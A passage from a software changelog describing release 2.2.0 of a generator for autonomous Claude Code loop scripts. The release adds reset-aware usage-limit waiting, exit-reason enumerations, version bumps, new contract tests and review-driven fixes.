byte changes: `.claude/sdk_gates/gates.py` (both); `.claude/loop.sh` +
`.claude/goal-loop.sh` (full_autonomous, worktree comment). Diff-verified
vs the prior head: zero files added, zero removed.

## 2.1.0 → 2.2.0 (usage-limit coping + gap-closure merge)

**Spec:** `Bootstrap-Protocol-v2-2-0.md` (AR2-corrected) +
`Bootstrap-Protocol-Companion-v2-2-0.md`. Reset-aware usage-limit handling
bound into the per-task wrapper skeletons' comment contract, consuming the
Claude Agent SDK's `rate_limit_event` / `RateLimitInfo` stream contract,
plus the gap-closure items (deliverable contract, `exit_reason` enum and
run-summary structure enumerated in emitted comments, blessed goal-config
extras already shipped at 2.1.0). Changelog-first; minimal-diff; fail-loud;
no drive-by refactors. Work items R1–R8 map 1:1 to the implementation
prompt.

Live-capture basis (Step 0): `claude -p "say ok" --output-format
stream-json --verbose` on CLI 2.1.215 confirmed the wire shape used
below — NDJSON lines with a top-level `type`, and a `rate_limit_event`
line carrying a nested `rate_limit_info` object with camelCase
`status` / `resetsAt` / `rateLimitType` (observed value `seven_day`,
`status: "allowed_warning"`). Confirms AR2-03.

### R1 — Three usage-limit-wait config keys

`usage_limit_wait` (`reset-aware` | `off`, default `reset-aware`),
`usage_limit_max_wait_seconds` (default `21600`), and
`usage_limit_wait_jitter_seconds` (default `60`) added to **both**
`loop-config.md` and `goal-config.md`, adjacent to the existing
`infra_retry_seconds` / `infra_max_consecutive_failures` pair, each with a
one-line comment (PRD Phase 9.5, §`.claude/loop-config.md` / Phase 9.6
`goal-config.md`). Existing config files without the keys stay valid — the
wrappers apply the documented defaults (Companion Migration notes).

### R2 — Dispatch flags on the documented invocation

The skeleton's documented `claude -p` dispatch instruction gains
`--output-format stream-json --verbose` alongside `--worktree` (flags
added, nothing removed) in the `[IC-6]` header and the closing dispatch
echo of `_per_task_wrapper`. The NDJSON stream these flags produce is what
the usage-limit branch tails (PRD Phase 9.5 "Infrastructure-error
handling").

### R3 — Per-task skeleton binding comments (usage-limit vs transient split)

New normative comment block in `_per_task_wrapper` (emitted into both
`loop.sh` and `goal-loop.sh`), wording per PRD Phase 9.5 (AR2-01/02/03/05
corrected): match `rate_limit_event` by the line's **top-level `type`**
(never substring); camelCase wire keys in nested `rate_limit_info`
(`status`, `resetsAt` Unix seconds may-be-absent, `rateLimitType` ∈
five_hour | seven_day | seven_day_opus | seven_day_sonnet | overage);
record the most recent event before exit; on a non-expected non-zero exit
a `rejected` + future `resetsAt` → usage-limit path, `rejected` +
absent/past `resetsAt` → transient path; `reset-aware` wait =
`(resetsAt − now) + jitter` (jitter uniform `0..usage_limit_wait_jitter_seconds`,
added only), ceiling `usage_limit_max_wait_seconds` → halt with
`usage-limit-reset-abandoned` into `loop-final-<task-id>.md` surfacing
bucket + reset time; otherwise sleep then re-probe the **same** iteration
without incrementing the counter; the wait does **not** consume the
transient retry; **never compute your own reset time** (honor `resetsAt`
as floor-plus-jitter, never hardcode +5h/+7d); `usage_limit_wait: off`
routes rejections to the transient path; fail-loud fallback if the build
stops emitting `rate_limit_event`; substrate-independent
`CLAUDE_CODE_RETRY_WATCHDOG=1` watchdog note (in-request retry,
complementary, not gated on `gate_substrate`).

### R4 — `goal-loop.sh` judge-parity comment

A `rejected` usage-limit `rate_limit_event` on **either** the `claude -p`
call **or** the judge call takes the same reset-aware wait path and does
**not** consume the judge retry-once (PRD `.claude/goal-loop.sh` /
`goal-config.md` descriptions). Injected only into `goal-loop.sh` via the
per-kind parity placeholder; `loop.sh` does not carry it.

### R5 — `auto.sh` skeleton comments (enum + run-summary + runner rule)

New comment block in `_auto_sh` enumerating **all 13** `exit_reason`
values with one-line triggers (Recovery & State enum, PRD lines 138–150);
the required run-summary structure incl. the `Ended because` line (code +
one plain sentence; `urgent-escalation` names the pending-decision note;
`usage-limit-reset-abandoned` names the limiting bucket `rate_limit_type`
and reset time `resets_at`); the AR2-01 terminal runner rule (an observed
`usage-limit-reset-abandoned` task halt is terminal-at-queue-level via
graceful shutdown, propagates the bucket/reset time, and counts toward
**neither** the three-consecutive-halts threshold **nor** the
infrastructure-failure threshold — the cap is account-level, so continuing
manufactures a mislabeled `three-consecutive-halts` cascade); and the
AR2-09c **key-less** runner posture (brief sleep + retry, two consecutive
runner-level failures → halt; `auto-config.md` keeps its budget keys and
gains no runner-level `infra_*` keys).

### R6 — Version identity + citation re-baseline (RC-03)

- `PROTOCOL_VERSION` → `"2.2.0"` (`lib/installer.py`, `lib/templates.py`).
  `INSTALLER_VERSION` stays `"1.1.0"`; `RETROFIT_PROTOCOL_VERSION` stays
  `"1.6.2"`. Test literals re-pinned. `plugin/plugin.json` version +
  description → 2.2.0 (review finding: the 2.1.0 release-identity commit
  `0ac36bd` established plugin.json as part of the release set; the
  implementation prompt's R6 omitted it).
- **RC-03 (decided: yes):** emitted protocol-document citations
  `Bootstrap-Protocol-v2-0-0.md` → `Bootstrap-Protocol-v2-2-0.md`, **scoped
  to the files this change already touches** — `loop.sh`, `goal-loop.sh`,
  `loop-config.md`, `goal-config.md`, `auto.sh`. The 11 emitted hook
  citations are **deliberately left at `v2-0-0`**: re-pointing them would
  change bytes in the *default* fixture (11 hook files) outside the named
  FREEZE-EXCEPTION set, violating the mandated "zero unintended byte
  changes outside the named set" gate. This is the same citation-lag
  posture as freeze-exception no. 12 (2.1.0 kept citations at v2-0-0). The
  citation bytes re-pointed here ride inside the no. 15 re-baseline below.
  *(Operator flag: this partial re-point is an intentional, gate-forced
  scope decision, not an omission — see the session report.)*

### R7 — New suite `tests/test_usage_limit_contract.py`

Standalone-suite style (own pass/fail counter, `sys.exit(1)` on any
failure). Emits both fixtures via `build_plan` and string-asserts the
config keys/defaults/co-location, the per-task skeleton contract strings
(both wrappers, plus the goal-only judge-parity sentence), the `auto.sh`
enum + render clause + runner rule, and the negative assertion that no
`usage_limit_*` key appears in `auto-config.md`.

### R8 — Eighth IC check: deferred (AR2-09b)

Not added. Recorded post-2.2.0 in the PRD with its cost-of-deferral line;
the golden fixtures + R7 cover the repo-side risk. AR2-09a (no emitted
run-summary template file) likewise stands — the structure is bound only
through `auto.sh`'s comment contract.

**Test count (measured, honest).** Pre-change: **706** checks / 13 files
(RC-08: the 2.1.0 section's "726" was a stale never-measured tally,
corrected above). Post-change: **802** checks / 14 files — the delta is
`tests/test_usage_limit_contract.py` (**95** checks after the review-pass
strengthening below) plus one new release-identity check in
`test_ic_gate.py` (44 → 45) and re-pinned version literals in existing
suites; the golden digests re-baseline (no. 15) but the action counts
(default 55 / full_autonomous 67) are unchanged.

**Adversarial-review fix pass (pre-merge, multi-lens).** Eight finder
angles + per-candidate verification over the working diff; six confirmed
findings fixed (zero emitted-byte impact — golden digests unchanged,
verified):
1. `plugin/plugin.json` bumped to 2.2.0 (see R6 above).
2. `test_ic_gate.py` gains the `2.1.0 → 2.2.0` changelog-entry tripwire
   (the convention the 2.1.0 release established but R6 didn't carry
   forward).
3. R5 enum assertions anchored to the emitted enum-block line shape
   (`"\n#   <value>  "`) plus a set-equality count guard parsed from the
   emitted block — mutation-verified: 7 of 13 enum literals were
   previously satisfiable by occurrences outside the enum block, and the
   old count guard compared the test's own list to a literal (tautology).
4. AR2-01 assertions anchored (`ar2-01,\n#  terminal.]`) and the
   counted-toward-neither rule asserted as one contiguous
   whitespace-normalized clause — mutation-verified against a
   semantics-inverting edit that the old fragment checks passed.
5. Six subsumed R1 bare-key checks collapsed into the key+default needles
   (the `test_goal_evaluator_keys.py` convention).
6. New RC-03 citation-integrity checks: the five re-pointed files cite
   `Bootstrap-Protocol-v2-2-0.md` with no stale `v2-0-0` residue, and both
   cited docs exist at the repo root (they are new files this release —
   an omitted `git add` would otherwise ship dangling citations with CI
   green). Two stale Python-side (non-emitted) `v2-0-0` comments in the
   touched `_auto_sh` / `_per_task_wrapper` regions re-pointed.
Round 2 (fresh-eyes pass over the fixed diff; three confirmed
spec-fidelity findings, all emitted-byte changes riding inside the no. 15
named set — `loop.sh`/`goal-loop.sh`/`auto.sh` only, default fixture
untouched, digest re-verified):
7. The usage-limit vs transient split now DEFINES the transient arm
   instead of only referencing it: a third classification arm (no
   `"rejected"` `rate_limit_event` at all — network error, 5xx, 529 —
   → transient path) and a transient-path paragraph naming
   `infra_retry_seconds` / `infra_max_consecutive_failures` and the
   same-iteration no-increment retry (Phase 9.5 transient paragraph; the
   deliverable contract requires the comments to enumerate the split, and
   half of it was previously implicit).
8. `auto.sh` enum one-liners restore two load-bearing qualifiers dropped
   from the Recovery & State wording: `three-consecutive-halts` is scoped
   "within the run", and `operator-only-timeout`'s blocking is
   "transitively" on operator action.
9. The suite now emits BOTH fixtures (its docstring/this-section claim was
   previously false): a default-fixture negative asserts no `usage_limit`
   text leaks into any non-autonomous emitted file and no wrappers are
   emitted; plus transient-arm and enum-qualifier assertions (85 → 95).
Report-only (deliberate non-fixes): the emitted wrapper `log()`/sentinel
`printf '%s\\n'` literal-backslash-n quirk is pre-existing at 2.1.0 and on
the recorded deferred-cleanup backlog — fixing it perturbs frozen emitted
bytes and belongs to its own freeze-exception, not this change.

**FREEZE-EXCEPTION (golden re-baseline no. 15).** Emitted-byte changes,
diff-verified vs the pre-change head (zero files added, zero removed):
- **`full_autonomous` fixture (6 files):** `loop.sh` and `goal-loop.sh`
  (R2 dispatch flags + R3 usage-limit comment block + R4 goal-parity
  comment on goal-loop.sh + RC-03 citation re-point); `loop-config.md` and
  `goal-config.md` (R1 three keys + RC-03 citation re-point); `auto.sh`
  (R5 enum/run-summary/runner comment block + RC-03 citation re-point);
  `settings.json` `_generatedBy` (R6, `protocol 2.1.0` → `protocol
  2.2.0`).
- **`default` fixture (1 file):** `settings.json` `_generatedBy` only
  (`protocol 2.1.0` → `protocol 2.2.0`). The default fixture emits no
  wrappers/config/runner, so R1–R5 and the RC-03 re-point do not reach it;
  its hook citations remain at `v2-0-0` by design (see R6).
Everything outside this named set is byte-identical to the pre-change head.
